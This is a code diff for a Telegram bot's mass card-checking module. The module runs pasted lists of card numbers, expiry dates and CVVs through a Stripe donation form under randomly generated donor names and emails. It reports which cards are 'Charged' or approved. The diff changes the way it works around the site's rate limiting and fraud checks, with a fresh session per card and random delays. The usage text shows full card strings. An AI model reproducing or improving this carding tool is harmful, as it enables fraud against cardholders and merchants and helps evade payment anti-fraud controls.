@@ -1,4 +1,4 @@
-# BOT/gates/charge/stripe/masscharge.py
+# BOT/gates/mass/masscharge.py
 
 import asyncio
 import json
@@ -15,7 +15,7 @@ import string
 import os
 from pathlib import Path
 
-# CORRECT IMPORTS based on your scharge.py and credit.py
+# CORRECT IMPORTS based on your structure
 from BOT.gates.charge.stripe.scharge import StripeChargeChecker, logger, load_users, is_user_banned, check_cooldown, get_user_plan
 from BOT.helper.permissions import auth_and_free_restricted
 from BOT.helper.Admins import is_command_disabled, get_command_offline_message
@@ -153,246 +153,57 @@ async def parse_card_list_from_reply(client, message):
     
     return card_list, file_path
 
-def is_valid_card_line(line):
-    """
-    Check if a line contains a valid card in format: XXXXXXXXXXXXXXXX|MM|YY|CVV
-    """
-    line = line.strip()
-    if not line:
-        return False
-    
-    # Pattern: 15-16 digits | 1-2 digits | 2-4 digits | 3-4 digits
-    pattern = r'^\d{15,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}$'
-    return bool(re.match(pattern, line))
-
 async def parse_card_list_from_command(message):
-    """
-    Parse card list when cards are in the same message as command
-    Each card should be on a new line after the command
-    """
+    """Parse card list when cards are in the same message as command"""
     card_list = []
     
     # Get the full message text
     full_text = message.text or ""
-    print(f"Full message text: {full_text}")
     
+    # Remove the command part
     # Split by lines
     lines = full_text.split('\n')
-    print(f"Split into {len(lines)} lines")
     
-    # Process each line
+    # Skip the first line if it contains the command
     for i, line in enumerate(lines):
         line = line.strip()
         if not line:
             continue
+            
+        # Check if this line contains the command
+        if i == 0 and any(line.startswith(prefix) for prefix in ['/mxc', '.mxc', '$mxc']):
+            # This is the command line, extract content after command
+            parts = line.split()
+            if len(parts) > 1:
+                # There might be cards on the same line
+                remaining_text = ' '.join(parts[1:]).strip()
+                if remaining_text:
+                    # Extract cards from this text
+                    all_cards, unique_cards = extract_cards(remaining_text)
+                    card_list.extend(unique_cards)
+            continue
         
-        # First line might contain the command
-        if i == 0:
-            # Check if this line starts with command
-            if any(line.startswith(prefix) for prefix in ['/mxc', '.mxc', '$mxc']):
-                # Remove the command part
-                parts = line.split(maxsplit=1)
-                if len(parts) > 1:
-                    # There might be a card on the same line after command
-                    card_part = parts[1].strip()
-                    if card_part and is_valid_card_line(card_part):
-                        card_list.append(card_part)
-                        print(f"Added card from command line: {card_part}")
-                # Skip to next line
-                continue
-            else:
-                # First line doesn't have command, treat as card
-                if is_valid_card_line(line):
-                    card_list.append(line)
-                    print(f"Added card from line {i+1}: {line}")
-        else:
-            # Subsequent lines - these should be cards
-            if is_valid_card_line(line):
-                card_list.append(line)
-                print(f"Added card from line {i+1}: {line}")
-            else:
-                print(f"Line {i+1} is not a valid card format: {line}")
+        # Regular line - extract cards from this line
+        if line:
+            all_cards, unique_cards = extract_cards(line)
+            card_list.extend(unique_cards)
     
-    print(f"📝 Final parsed {len(card_list)} cards: {card_list}")
-    return card_list
+    # Remove duplicates while preserving order
+    seen = set()
+    unique_cards = []
+    for card in card_list:
+        if card not in seen:
+            seen.add(card)
+            unique_cards.append(card)
+    
+    return unique_cards
 
 class MassStripeChargeChecker:
     def __init__(self):
         self.checker = StripeChargeChecker()
-        self.current_client = None
-        self.current_tokens = None
         self.retry_count = 0
         self.max_retries = 2  # Maximum retries per card when rate limited
         
-    async def create_fresh_session(self):
-        """Create a brand new session with new tokens"""
-        try:
-            # Close existing session if any
-            if self.current_client:
-                try:
-                    await self.current_client.aclose()
-                except:
-                    pass
-                self.current_client = None
-                self.current_tokens = None
-            
-            # Create new client and get tokens
-            logger.info("🔄 Creating fresh session with new tokens...")
-            client = httpx.AsyncClient(
-                timeout=30.0,
-                follow_redirects=True,
-                limits=httpx.Limits(max_keepalive_connections=5, max_connections=10),
-                http2=True
-            )
-            
-            # Get form tokens
-            tokens, error = await self.checker.get_form_tokens(client)
-            
-            if tokens:
-                self.current_client = client
-                self.current_tokens = tokens
-                self.retry_count = 0
-                logger.success("✅ New session created successfully")
-                return True, client, tokens
-            else:
-                logger.error(f"❌ Failed to create session: {error}")
-                await client.aclose()
-                return False, None, None
-                
-        except Exception as e:
-            logger.error(f"❌ Error creating session: {str(e)}")
-            return False, None, None
-    
-    def is_rate_limit_error(self, error_message):
-        """Check if error message indicates rate limiting"""
-        rate_limit_patterns = [
-            "rate limit",
-            "too many requests",
-            "try again later",
-            "session expired",
-            "for security",
-            "please wait",
-            "429",
-            "403",
-            "cannot add a new payment method so soon",
-            "nonce",
-            "invalid nonce"
-        ]
-        
-        error_lower = error_message.lower()
-        for pattern in rate_limit_patterns:
-            if pattern in error_lower:
-                return True
-        return False
-    
-    async def check_card_with_session(self, card_details, username, user_data, client=None, tokens=None, retry_count=0):
-        """OPTIMIZED: Check card using existing session (for mass checking) with rate limit handling"""
-        start_time = time.time()
-        
-        # Parse card details
-        cc, mes, ano, cvv = self.parse_card_details(card_details)
-        
-        if not cc or not mes or not ano or not cvv:
-            bin_info = await self.checker.get_bin_info("")
-            return self.format_mass_card_response(
-                cc, mes, ano, cvv, "ERROR", "Invalid card format", 
-                username, time.time()-start_time, user_data, bin_info
-            )
-        
-        try:
-            # Get BIN info
-            bin_info = await self.checker.get_bin_info(cc)
-            
-            # Generate user details
-            first_names = ["John", "Jane", "Robert", "Mary", "David", "Sarah", "Michael", "Lisa", "James", "Emma"]
-            last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"]
-            
-            first_name = random.choice(first_names)
-            last_name = random.choice(last_names)
-            domains = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "icloud.com"]
-            domain = random.choice(domains)
-            email = f"{first_name.lower()}.{last_name.lower()}{random.randint(1000,9999)}@{domain}"
-            
-            user_info = {
-                'first_name': first_name,
-                'last_name': last_name,
-                'email': email
-            }
-            
-            # Create payment method
-            payment_result = await self.checker.create_stripe_payment_method(client, (cc, mes, ano, cvv), user_info)
-            
-            if not payment_result['success']:
-                # Check for rate limit error - retry with new session if needed
-                if self.is_rate_limit_error(payment_result['error']) and retry_count < self.max_retries:
-                    logger.info(f"🔄 Rate limit detected, retrying with new session (attempt {retry_count + 1})")
-                    
-                    # Create new session for this card only
-                    success, new_client, new_tokens = await self.create_fresh_session()
-                    if success:
-                        # Retry this card with new session
-                        result = await self.check_card_with_session(
-                            card_details, username, user_data, new_client, new_tokens, retry_count + 1
-                        )
-                        # Close the new session after use
-                        try:
-                            await new_client.aclose()
-                        except:
-                            pass
-                        return result
-                    else:
-                        return self.format_mass_card_response(
-                            cc, mes, ano, cvv, "DECLINED", "Rate limit - failed to create new session", 
-                            username, time.time()-start_time, user_data, bin_info
-                        )
-                
-                return self.format_mass_card_response(
-                    cc, mes, ano, cvv, "DECLINED", payment_result['error'], 
-                    username, time.time()-start_time, user_data, bin_info
-                )
-            
-            # Submit donation
-            result = await self.checker.submit_donation(client, tokens, payment_result['payment_method_id'], user_info)
-            
-            elapsed_time = time.time() - start_time
-            
-            # Determine status for formatting
-            if result['status'] == 'APPROVED':
-                status = "APPROVED"
-            else:
-                status = "DECLINED"
-            
-            return self.format_mass_card_response(
-                cc, mes, ano, cvv, status, result['message'], 
-                username, elapsed_time, user_data, bin_info
-            )
-                
-        except Exception as e:
-            # Check if it's a rate limit error in the exception
-            if self.is_rate_limit_error(str(e)) and retry_count < self.max_retries:
-                logger.info(f"🔄 Rate limit exception, retrying with new session (attempt {retry_count + 1})")
-                
-                # Create new session for this card only
-                success, new_client, new_tokens = await self.create_fresh_session()
-                if success:
-                    # Retry this card with new session
-                    result = await self.check_card_with_session(
-                        card_details, username, user_data, new_client, new_tokens, retry_count + 1
-                    )
-                    # Close the new session after use
-                    try:
-                        await new_client.aclose()
-                    except:
-                        pass
-                    return result
-            
-            # Not a rate limit error or max retries exceeded
-            bin_info = await self.checker.get_bin_info(cc)
-            return self.format_mass_card_response(
-                cc, mes, ano, cvv, "ERROR", str(e)[:80], 
-                username, time.time()-start_time, user_data, bin_info
-            )
-    
     def format_mass_card_response(self, cc, mes, ano, cvv, status, message, username, elapsed_time, user_data, bin_info):
         """Format individual card response for mass check with /mxc in header"""
         user_id = user_data.get("user_id", "Unknown")
@@ -419,20 +230,29 @@ class MassStripeChargeChecker:
             "authentication_required"
         ]
 
+        # Check for decline patterns
+        decline_patterns = [
+            "declined",
+            "failed",
+            "error",
+            "unsupported",
+            "invalid"
+        ]
+
         status_flag = "Declined ❌"
         status_emoji = "❌"
 
-        if "APPROVED" in status:
+        if any(pattern in raw_message for pattern in success_patterns):
             status_flag = "Charged 💎"
-            status_emoji = "✅"
-        elif any(pattern in raw_message for pattern in success_patterns):
-            status_flag = "Charged 💎"
-            status_emoji = "✅"
+            status_emoji = "💎"
         elif "3d secure❎" in raw_message.lower():
             status_flag = "3D Secure ❎"
             status_emoji = "❎"
         elif any(pattern in raw_message for pattern in three_d_patterns):
             status_flag = "3D Secure ❎"
+            status_emoji = "❎"
+        elif "approved" in status.lower():
+            status_flag = "Approved ❎"
             status_emoji = "❎"
 
         clean_name = re.sub(r'[↯⌁«~∞🍁]', '', first_name).strip()
@@ -459,7 +279,7 @@ class MassStripeChargeChecker:
         return response
     
     def parse_card_details(self, card_details):
-        """Parse card details from string in standard format CC|MM|YYYY|CVV"""
+        """Parse card details from string"""
         try:
             cc_parts = card_details.split('|')
             if len(cc_parts) < 4:
@@ -470,27 +290,13 @@ class MassStripeChargeChecker:
             ano = cc_parts[2].strip()
             cvv = cc_parts[3].strip()
             
-            # Validate basic card format
-            if not cc.isdigit() or len(cc) < 15:
-                return "", "", "", ""
-            
-            if not mes.isdigit() or not (1 <= int(mes) <= 12):
-                return "", "", "", ""
-            
             # Format month with leading zero if needed
             if len(mes) == 1:
                 mes = f"0{mes}"
             
-            # Format year if needed (for 2-digit years)
-            if len(ano) == 2 and ano.isdigit():
+            # Format year if needed
+            if len(ano) == 2:
                 ano = '20' + ano
-            elif len(ano) == 4 and ano.isdigit():
-                pass  # Already in YYYY format
-            else:
-                return "", "", "", ""
-            
-            if not cvv.isdigit() or len(cvv) not in [3, 4]:
-                return "", "", "", ""
                 
             return cc, mes, ano, cvv
         except:
@@ -502,7 +308,7 @@ class MassStripeChargeChecker:
         
         return f"""<b>「$cmd → /mxc」| <b>WAYNE</b> </b>
 ━━━━━━━━━━━━━━━
-🔄 <b>Mass Stripe Charge (10$)</b>
+🔄 <b>Mass Stripe Charge</b>
 
 📊 <b>Checked:</b> <code>{checked}/{total_cards}</code>
 ✅ <b>Hits:</b> <code>{hits}</code>
@@ -512,8 +318,7 @@ class MassStripeChargeChecker:
 
 ━━━━━━━━━━━━━━━
 👤 <b>User:</b> @{username}
-💎 <b>Plan:</b> {user_plan}
-💳 <b>Credits:</b> <code>5</code> (deducted per mass check)"""
+💎 <b>Plan:</b> {user_plan}"""
     
     async def send_approved_card_immediately(self, client, message, result, card_number, total_cards):
         """Send approved card immediately without waiting for all cards to finish"""
@@ -545,7 +350,7 @@ class MassStripeChargeChecker:
         # Send final summary (ONLY ONCE, no duplicate footer)
         summary = f"""<b>「$cmd → /mxc」| <b>WAYNE</b> </b>
 ━━━━━━━━━━━━━━━
-<b>[•] Gateway -</b> Stripe Charge 10$ Mass
+<b>[•] Gateway -</b> Stripe Charge Mass
 <b>[•] Status -</b> <code>Complete ✅</code>
 ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
 <b>[+] Results:</b> ✅ {successful} | ❌ {failed}
@@ -577,7 +382,7 @@ class MassStripeChargeChecker:
         # Start with header (ONLY ONCE)
         response = f"""<b>「$cmd → /mxc」| <b>WAYNE</b> </b>
 ━━━━━━━━━━━━━━━
-<b>[•] Gateway -</b> Stripe Charge 10$ Mass
+<b>[•] Gateway -</b> Stripe Charge Mass
 <b>[•] Status -</b> <code>Complete ✅</code>
 ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
 <b>[+] Results:</b> ✅ {successful} | ❌ {failed}
@@ -701,16 +506,15 @@ async def handle_mass_stripe_charge(client: Client, message: Message):
 <b>Format 1 (Reply to file/text):</b>
 • Reply to a text file or message containing cards with /mxc
 
-<b>Format 2 (Multi-line after command - RECOMMENDED):</b>
+<b>Format 2 (Multi-line after command):</b>
 <code>/mxc
-4340762010740112|03|28|936
-5189410124832133|04|28|100
-5253020004358553|05|26|048</code>
+5414963811565512|09|28|822
+4221352001240530|12|26|050</code>
 
-<b>Format 3 (Single line with multiple cards - NOT RECOMMENDED):</b>
-<code>/mxc 4340762010740112|03|28|936 5189410124832133|04|28|100</code>
+<b>Format 3 (Single line):</b>
+<code>/mxc 5414963811565512|09|28|822</code>
 
-⟐ <b>Note:</b> <code>Each card MUST be on a new line for best results</code>
+⟐ <b>Note:</b> <code>Cards will be auto-filtered from any format</code>
 ━━━━━━━━━━━━━""")
             return
         
@@ -781,51 +585,28 @@ async def handle_mass_stripe_charge(client: Client, message: Message):
         failed = 0
         errors = 0
         
-        # OPTIMIZATION: Create ONE shared session for ALL cards
-        print("🔄 Creating shared session for mass charge...")
-        client = httpx.AsyncClient(
-            timeout=30.0,
-            follow_redirects=True,
-            limits=httpx.Limits(max_keepalive_connections=5, max_connections=10),
-            http2=True
-        )
-        
-        # Get form tokens for the shared session
-        tokens, error = await mass_checker.checker.get_form_tokens(client)
-        
-        if not tokens:
-            await processing_msg.edit_text(f"""<pre>❌ Session Creation Failed</pre>
-━━━━━━━━━━━━━
-⟐ <b>Message</b>: Failed to create session for mass charge.
-⟐ <b>Error</b>: <code>{error}</code>
-⟐ <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
-━━━━━━━━━━━━━""")
-            await client.aclose()
-            return
-        
-        print(f"✅ Shared session created successfully with tokens")
-        
-        # Process each card using the SAME shared session
+        # Process each card - CHARGE REQUIRES FRESH SESSION FOR EACH CARD
+        # Unlike auth where we can share sessions, charge needs separate sessions
         for i, card_details in enumerate(card_list):
             checked = i + 1
             
-            print(f"Processing card {checked}/{card_count}: {card_details}")
-            
-            # Check card using the shared session (with rate limit handling)
+            # Create fresh client and checker for each card
+            client = None
             try:
-                result = await mass_checker.check_card_with_session(
+                # Create new checker instance for each card
+                card_checker = StripeChargeChecker()
+                
+                # Check card using fresh session (charge requires fresh session per card)
+                result = await card_checker.check_card(
                     card_details, 
                     username, 
-                    user_data,
-                    client=client,
-                    tokens=tokens,
-                    retry_count=0
+                    user_data
                 )
                 
                 # Store result for potential collective response
                 results.append(result)
                 
-                if "APPROVED" in result or "Charged 💎" in result or "✅" in result:
+                if "Charged 💎" in result or "Approved ❎" in result or "3D Secure ❎" in result:
                     successful += 1
                     # For >5 cards, send approved cards immediately
                     if card_count > 5:
@@ -833,26 +614,26 @@ async def handle_mass_stripe_charge(client: Client, message: Message):
                             client, message, result, i+1, card_count
                         )
                         approved_sent += 1
-                elif "DECLINED" in result or "❌" in result:
+                elif "DECLINED" in result or "Declined" in result:
                     failed += 1
                 else:
                     errors += 1
                     
             except Exception as e:
-                print(f"Error processing card {card_details}: {e}")
                 # Handle individual card error
-                # Parse card details for error response
-                cc_parts = card_details.split('|')
-                cc = cc_parts[0].strip().replace(" ", "") if len(cc_parts) > 0 else ""
-                mes = cc_parts[1].strip() if len(cc_parts) > 1 else ""
-                ano = cc_parts[2].strip() if len(cc_parts) > 2 else ""
-                cvv = cc_parts[3].strip() if len(cc_parts) > 3 else ""
+                bin_info = await mass_checker.checker.get_bin_info(card_details.split('|')[0] if '|' in card_details else "")
                 
-                bin_info = await mass_checker.checker.get_bin_info(cc if cc else "")
                 error_result = mass_checker.format_mass_card_response(
-                    cc, mes, ano, cvv,
-                    "ERROR", f"Check failed: {str(e)[:50]}", 
-                    username, 0, user_data, bin_info
+                    card_details.split('|')[0] if '|' in card_details else "",
+                    card_details.split('|')[1] if len(card_details.split('|')) > 1 else "",
+                    card_details.split('|')[2] if len(card_details.split('|')) > 2 else "",
+                    card_details.split('|')[3] if len(card_details.split('|')) > 3 else "",
+                    "ERROR", 
+                    f"Check failed: {str(e)[:50]}", 
+                    username, 
+                    0, 
+                    user_data, 
+                    bin_info
                 )
                 results.append(error_result)
                 errors += 1
@@ -865,20 +646,12 @@ async def handle_mass_stripe_charge(client: Client, message: Message):
                             card_count, checked, successful, failed, errors, username, plan_name
                         )
                     )
-                except Exception as e:
-                    print(f"Failed to update progress: {e}")
+                except:
+                    pass
             
             # Add delay between cards to avoid rate limiting
             if i < len(card_list) - 1:
-                await asyncio.sleep(random.uniform(2, 3))
-        
-        # Close the shared session after all cards are processed
-        if client:
-            try:
-                await client.aclose()
-                print("✅ Shared session closed successfully")
-            except:
-                print("⚠️ Failed to close shared session")
+                await asyncio.sleep(random.uniform(2, 4))  # Longer delay for charge
         
         elapsed_time = time.time() - start_time
         
